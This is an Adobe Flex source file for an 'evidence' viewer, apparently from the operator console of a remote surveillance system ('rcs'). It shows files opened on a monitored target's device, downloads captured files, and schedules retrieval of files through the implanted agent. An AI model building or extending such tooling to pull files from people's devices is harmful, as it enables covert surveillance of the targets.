<?xml version="1.0" encoding="utf-8"?>
<renderers:EvidenceDataRenderer xmlns:fx="http://ns.adobe.com/mxml/2009"
																xmlns:s="library://ns.adobe.com/flex/spark"
																xmlns:mx="library://ns.adobe.com/flex/mx"
																xmlns:renderers="it.ht.rcs.console.operations.view.evidences.renderers.*"
																width="100%"
																height="100%"
																creationComplete="init()">

	<fx:Script>
		<![CDATA[
			import flashx.textLayout.conversion.TextConverter;

			import it.ht.rcs.console.DB;
			import it.ht.rcs.console.agent.controller.AgentManager;
			import it.ht.rcs.console.evidence.controller.EvidenceManager;
			import it.ht.rcs.console.utils.FileUtils;
			import it.ht.rcs.console.utils.Size;
			import it.ht.rcs.console.utils.StringUtils;

			import locale.R;

			import mx.controls.Alert;
			import mx.rpc.events.ResultEvent;

			private var file:flash.filesystem.File;
			private var stream:URLStream;
			private var extension:String;
			private var originalName:String;
			private var request:URLRequest

			[Bindable]
			private var isImage:Boolean

			[Bindable]
			private var frameSize:Number=4;

			[Bindable]
			private var imgW:Number=80;

			[Bindable]
			private var imgH:Number=80;


			[Bindable]
			override public function set data(value:*):void
			{

				super.data=value;
				init()

			}

			private function init():void
			{
				if (data)
				{
					isImage=false;
					if (data.data.type == "open")
					{
						programTxt.textFlow=TextConverter.importToFlow("<b>" + R.get('PROGRAM') + ": </b>" + data.data.program, TextConverter.TEXT_FIELD_HTML_FORMAT);
						programTxt.visible=programTxt.includeInLayout=true;
					}
					else
					{
						programTxt.textFlow=TextConverter.importToFlow("<b>" + R.get('PROGRAM') + ": </b>" + "", TextConverter.TEXT_FIELD_HTML_FORMAT);
						programTxt.visible=programTxt.includeInLayout=false;
					}

					pathTxt.textFlow=TextConverter.importToFlow("<b>" + R.get('PATH') + ": </b>" + data.data.path, TextConverter.TEXT_FIELD_HTML_FORMAT);
					if (isNaN(data.data.size))
					{
						sizeTxt.textFlow=TextConverter.importToFlow("<b>" + R.get('SIZE') + ": </b>" + "(unknown)", TextConverter.TEXT_FIELD_HTML_FORMAT);
					}
					else
					{
						sizeTxt.textFlow=TextConverter.importToFlow("<b>" + R.get('SIZE') + ": </b>" + Size.toHumanBytes(data.data.size), TextConverter.TEXT_FIELD_HTML_FORMAT);
					}
					accessTxt.textFlow=TextConverter.importToFlow("<b>Access Mask: </b>" + FileUtils.getAccessMask(data.data.access), TextConverter.TEXT_FIELD_HTML_FORMAT);
				}

				//preview image

				downloadStatusTxt.text="";
				downloadBtn.label="Download";

				var extension:String=StringUtils.getExtension(data.data.path)
				if (extension.toLowerCase() == "jpg" || extension.toLowerCase() == "png" || extension.toLowerCase() == "gif" && data.data.type=='capture')
				{
	        //image preview
					var target:String=EvidenceManager.instance.evidenceFilter.target;
					var url:String
					if (DB.instance.demo)
					{
						url="grid/" + data.data.path
					}
					else
					{
						url=DB.hostAutocomplete(Console.currentSession.server) + "grid/" + data.data._grid + "?target_id=" + encodeURIComponent(target);
					}
          img.source=url
					isImage=true;
				}
			}



			private function getFile():void
			{
				if (downloadBtn.label == "Download")
				{
					var target:String=EvidenceManager.instance.evidenceFilter.target;
					var url:String
					if (DB.instance.demo)
					{
						url="grid/" + data.data.path
					}
					else
					{
						url=DB.hostAutocomplete(Console.currentSession.server) + "grid/" + data.data._grid + "?target_id=" + encodeURIComponent(target);
					}

					originalName=StringUtils.getFilename(data.data.path)
					extension=StringUtils.getExtension(data.data.path)
					var fileName:String=data.data._grid + encodeURIComponent(target) + "_" + originalName;
					if (DB.instance.demo)
					{
						fileName=data.data.path
					}
					request=new URLRequest(url);
					stream=new URLStream();
					file=flash.filesystem.File.documentsDirectory.resolvePath(fileName);
					file.browseForSave("Download " + fileName);
					file.addEventListener(Event.SELECT, onSelect);
				}
				else if (downloadBtn.label == "Open")
				{
					try
					{
						openFile()
					}
					catch (e:Error)
					{
						downloadStatusTxt.text="Unable to open with default application."
					}

				}
			}

			private function openFile():void
			{
				file.openWithDefaultApplication()
			/*   var os:String=Capabilities.os.toLowerCase();
				trace(NativeProcess.isSupported)
				if(os.indexOf("windows")!=-1)
				{
					var sandboxie:flash.filesystem.File=new flash.filesystem.File();
					sandboxie.nativePath="C:/Program Files/Sandboxie/Start.exe"
					if (sandboxie.exists)
					{
						var nativeProcessStartupInfo:NativeProcessStartupInfo = new NativeProcessStartupInfo();
						nativeProcessStartupInfo.executable = sandboxie;
						var params:Vector.<String> = new Vector["<String>"]();
						params.push(file.nativePath);
						nativeProcessStartupInfo.arguments= params;
						var process:NativeProcess = new NativeProcess();
						process.start(nativeProcessStartupInfo);
					}
					else
					{
						file.openWithDefaultApplication()
					}
				}
				else
				{
					file.openWithDefaultApplication()
				}
			 */
			}



			private function onSelect(e:Event):void
			{
				downloadBtn.enabled=false;

				stream.addEventListener(Event.COMPLETE, onFileDownloaded);
				stream.addEventListener(ProgressEvent.PROGRESS, onDownloadProgress);
				stream.addEventListener(IOErrorEvent.IO_ERROR, onDownloadError);
				stream.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onDownloadError)
				stream.load(request);
			}

			private function onDownloadProgress(e:ProgressEvent):void
			{
				var perc:int=int((e.bytesLoaded / e.bytesTotal) * 100)
				downloadStatusTxt.text="Downloading file..." + perc + " % completed."
			}

			private function onDownloadError(e:*):void
			{
				downloadBtn.enabled=true;
				downloadStatusTxt.text="Error downloading file. Try again"
			}

			private function onFileDownloaded(e:Event):void
			{
				downloadBtn.label="Open"
				downloadStatusTxt.text="File downloaded successfully."
				downloadBtn.enabled=true;
				var fileData:ByteArray=new ByteArray();
				stream.readBytes(fileData, 0, stream.bytesAvailable);
				var fileStream:FileStream=new FileStream();
				fileStream.open(file, FileMode.WRITE);
				fileStream.writeBytes(fileData, 0, fileData.length);
				fileStream.close();

			}

			private function schedule():void
			{
				AgentManager.instance.createDownload(data.aid, data.data.path, onSchedule);
			}

			private function onSchedule(e:ResultEvent):void
			{
				Alert.show('Item scheduled for download');
			}
		]]>
	</fx:Script>

	<s:VGroup verticalAlign="top"
						height="100%"
						width="100%">
		<s:HGroup verticalAlign="top"
							width="100%">
			<s:RichText id="programTxt"
									width="75%"/>

			<s:RichText id="accessTxt"
									visible="{data.data.type=='open'}"
									includeInLayout="{data.data.type=='open'}"
									width="25%"/>

		</s:HGroup>
		<s:Line width="100%"
						visible="{data.data.type=='open'}"
						includeInLayout="{data.data.type=='open'}">
			<s:stroke>
				<s:SolidColorStroke color="0xCCCCCC"/>
			</s:stroke>
		</s:Line>
		<s:VGroup verticalAlign="top"
							width="100%">
			<s:RichText id="pathTxt"
									width="100%"/>

			<s:RichText id="sizeTxt"
									width="100%"/>
		</s:VGroup>
		<s:Line width="100%"
						visible="{data.data.type=='capture'}"
						includeInLayout="{data.data.type=='capture'}">
			<s:stroke>
				<s:SolidColorStroke color="0xCCCCCC"/>
			</s:stroke>
		</s:Line>
		<s:BorderContainer id="frame"
											 visible="{isImage}"
											 includeInLayout="{isImage}"
											 width="{img.width+(frameSize*2)}"
											 height="{img.height+(frameSize*2)}"
											 backgroundColor="0xFFFFFF"
											 borderColor="0xCCCCCC"
											 buttonMode="true"
											 useHandCursor="true">

			<s:BitmapImage id="img"
										 smooth="true"
										 width="{imgW}"
										 height="{imgH}"
										 scaleMode="zoom"
										 x="{frameSize-1}"
										 y="{frameSize-1}"
										 source=""
										 visible="{isImage}"
										 includeInLayout="{isImage}">
			</s:BitmapImage>
			<s:SWFLoader id="spinner"
									 width="30"
									 height="30"
									 x="27"
									 y="27"/>
		</s:BorderContainer>
		<s:HGroup visible="{data.data.type=='capture' &amp;&amp; Console.currentSession.user.is_view_export()}"
							includeInLayout="{data.data.type=='capture' &amp;&amp; Console.currentSession.user.is_view_export()}"
							verticalAlign="middle">
			<s:Button id="downloadBtn"
								label="Download"
								click="getFile()"/>
			<s:Label id="downloadStatusTxt"/>
		</s:HGroup>

		<s:HGroup visible="{data.data.type=='open'}"
							includeInLayout="{data.data.type=='open'}"
							verticalAlign="middle">
			<s:Button id="retrieveBtn"
								label="Retrieve"
								click="schedule()"/>
		</s:HGroup>

	</s:VGroup>
</renderers:EvidenceDataRenderer>
